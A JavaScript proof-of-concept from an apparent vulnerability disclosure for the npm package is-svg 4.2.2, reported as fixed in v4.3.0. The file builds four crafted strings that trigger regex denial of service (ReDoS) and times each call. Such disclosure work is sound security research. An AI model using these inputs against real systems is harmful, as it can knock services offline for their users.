/**
 * is-svg@4.2.2
 * Package Manager: npm
 * Link to published package: https://github.com/sindresorhus/is-svg
 * Link to GitHub repo: https://github.com/sindresorhus/is-svg
 * Severity level: High
 * Module Description: Check if a string or buffer is SVG
 * Additional Info: It allows cause a denial of service when checking crafted invalid SVG strings or buffers.
 * Contacted maintainer?: Yes
 * Open issue?: No
 * Fixed: Yes
 * https://github.com/sindresorhus/is-svg/releases/tag/v4.3.0
 */

//1) 1st ReDoS caused by the two sub-regexes [A-Z]+ and [^>]* in `removeDtdMarkupDeclarations`.
const isSvg = require('is-svg');
function build_attack1(n) {
var ret = '<!'
for (var i = 0; i < n; i++) {
ret += 'DOCTYPE'
}

return ret+"";
}
for(var i = 1; i <= 50000; i++) {
   if (i % 10000 == 0) {
       var time = Date.now();
       var attack_str = build_attack1(i);
       isSvg(attack_str);

       var time_cost = Date.now() - time;
       console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
 }
}

//2) 2nd ReDoS caused by ? the first sub-regex  \s*  in `entityRegex`.
function build_attack2(n) {
var ret = ''
for (var i = 0; i < n; i++) {
ret += ' '
}

return ret+"";
}
for(var i = 1; i <= 50000; i++) {
   if (i % 10000 == 0) {
       var time = Date.now();
       var attack_str = build_attack2(i);
       isSvg(attack_str);

       var time_cost = Date.now() - time;
       console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
 }
}


//3rd ReDoS caused by the sub-regex \s+\S*\s*  in `entityRegex`.
function build_attack3(n) {
var ret = '<!Entity'
for (var i = 0; i < n; i++) {
ret += ' '
}

return ret+"";
}
for(var i = 1; i <= 50000; i++) {
   if (i % 10000 == 0) {
       var time = Date.now();
       var attack_str = build_attack3(i);
       isSvg(attack_str);

       var time_cost = Date.now() - time;
       console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
 }
}

//4th ReDoS caused by the sub-regex \S*\s*(?:"|')[^"]+  in `entityRegex`.
function build_attack4(n) {
var ret = '<!Entity '
for (var i = 0; i < n; i++) {
ret += '\''
}

return ret+"";
}
for(var i = 1; i <= 50000; i++) {
   if (i % 10000 == 0) {
       var time = Date.now();
       var attack_str = build_attack4(i);
       isSvg(attack_str);

       var time_cost = Date.now() - time;
       console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
 }
}